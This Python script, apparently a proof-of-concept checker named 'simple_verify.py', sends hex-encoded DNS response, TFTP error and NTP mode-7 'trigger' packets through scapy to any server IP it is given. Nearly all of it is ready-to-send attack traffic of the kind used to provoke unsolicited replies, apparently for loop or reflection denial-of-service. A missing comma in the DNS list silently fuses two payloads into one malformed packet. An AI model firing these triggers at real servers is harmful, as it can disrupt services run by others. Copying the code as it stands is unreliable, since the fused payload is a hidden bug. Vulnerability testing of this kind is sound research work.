DNS_triggers = [
    '860c81000001000100000000076578616d706c6503636f6d0000010001076578616d706c6503636f6d00000100010001517f000401020304',
    '697481010001000100000000076578616d706c6503636f6d0000010001076578616d706c6503636f6d00000100010000ffa8000401020304',
    'fb8e81020001000000000000076578616d706c6503636f6d0000010001c00c00010001000000950004acd91344',
    'a74581800001000100000000076578616d706c6503636f6d0000010001076578616d706c6503636f6d000001000100015180000401020304c00c00010001000000000004ade623c5',
    '75a281800001000100010000076578616d706c6503636f6d0000010001076578616d706c6503636f6d000001000100015180000401020304076578616d706c6503636f6d000002000100015180001401610c69616e612d73657276657273036e657400',
    'a74581800001000100010001076578616d706c6503636f6d0000010001076578616d706c6503636f6d000001000100015180000401020304076578616d706c6503636f6d000002000100000708001401610c69616e612d73657276657273036e65740001610c69616e612d73657276657273036e6574000001000100000708000401020304'
    '860c818000010001000d000d076578616d706c6503636f6d0000010001076578616d706c6503636f6d000001000100015180000401020304000002000100032d90001401620c726f6f742d73657276657273036e657400000002000100032d90001401670c726f6f742d73657276657273036e657400000002000100032d900014016c0c726f6f742d73657276657273036e657400000002000100032d900014016d0c726f6f742d73657276657273036e657400000002000100032d90001401650c726f6f742d73657276657273036e657400000002000100032d90001401660c726f6f742d73657276657273036e657400000002000100032d90001401690c726f6f742d73657276657273036e657400000002000100032d90001401680c726f6f742d73657276657273036e657400000002000100032d90001401610c726f6f742d73657276657273036e657400000002000100032d900014016a0c726f6f742d73657276657273036e657400000002000100032d900014016b0c726f6f742d73657276657273036e657400000002000100032d90001401640c726f6f742d73657276657273036e657400000002000100032d90001401630c726f6f742d73657276657273036e65740001620c726f6f742d73657276657273036e6574000001000100078b000004c7090ec901670c726f6f742d73657276657273036e6574000001000100013f420004c0702404016c0c726f6f742d73657276657273036e657400000100010000ccf20004c707532a016d0c726f6f742d73657276657273036e65740000010001000798450004ca0c1b2101650c726f6f742d73657276657273036e65740000010001000038440004c0cbe60a01660c726f6f742d73657276657273036e657400000100010007c5220004c00505f101690c726f6f742d73657276657273036e65740000010001000713640004c024941101680c726f6f742d73657276657273036e657400000100010004c16f0004c661be3501610c726f6f742d73657276657273036e65740000010001000793600004c6290004016a0c726f6f742d73657276657273036e65740000010001000899c40004c03a801e016b0c726f6f742d73657276657273036e65740000010001000713640004c1000e8101640c726f6f742d73657276657273036e657400000100010002c0e30004c7075b0d01630c726f6f742d73657276657273036e6574000001000100069bb20004c021040c',
    '697481810001000100000000076578616d706c6503636f6d0000010001076578616d706c6503636f6d00000100010000ffb5000401020304',
    '411e81820001000000000000076578616d706c6503636f6d0000010001',
    '163481820001000100000000076578616d706c6503636f6d0000010001076578616d706c6503636f6d000001000100015180000401020304',
    '860c85800001000100000000076578616d706c6503636f6d0000010001076578616d706c6503636f6d000001000100015180000401020304',
    'a74580800001000100000000076578616d706c6503636f6d0000010001076578616d706c6503636f6d000001000100015180000401020304'
]

TFTP_triggers = [
'000000036e616d65696e76616c69642072657175657374',
'000500004163636573732076696f6c6174696f6e00',
'00050004496c6c6567616c2054465450206f7065726174696f6e',
'000500044261642046696c656e616d6500',
'00050004340000',
'00050005496c6c6567616c2054494400'
]


NTP_triggers = [
'9700060010000000',
'9f00060010000000',
'9f001a0e10000000',
'97001a0e30000000',
'9f00203410000000',
'9700203430000000',
'9f000a0010000000',
'97000a0030000000'
]



import sys
import time
from scapy.all import *

if __name__ == '__main__':
    if len(sys.argv)!=3:
        print("Usage:","python3 simple_verify.py <protocol> <server_ip>")
        exit(-1)
    
    proto = sys.argv[1]
    server_ip = sys.argv[2]
    ip_hdr = IP(dst=server_ip)
    
    if proto.lower()=='dns':
        udp_hdr = UDP(sport=53,dport=53)
        for load in DNS_triggers:
            send(ip_hdr/udp_hdr/bytes.fromhex(load))
            time.sleep(0.5)
    elif proto.lower()=='ntp':
        udp_hdr = UDP(sport=123,dport=123)
        for load in NTP_triggers:
            send(ip_hdr/udp_hdr/bytes.fromhex(load))
            time.sleep(0.5)
    elif proto.lower()=='tftp':
        udp_hdr = UDP(sport=69,dport=69)
        for load in TFTP_triggers:
            send(ip_hdr/udp_hdr/bytes.fromhex(load))
            time.sleep(0.5)



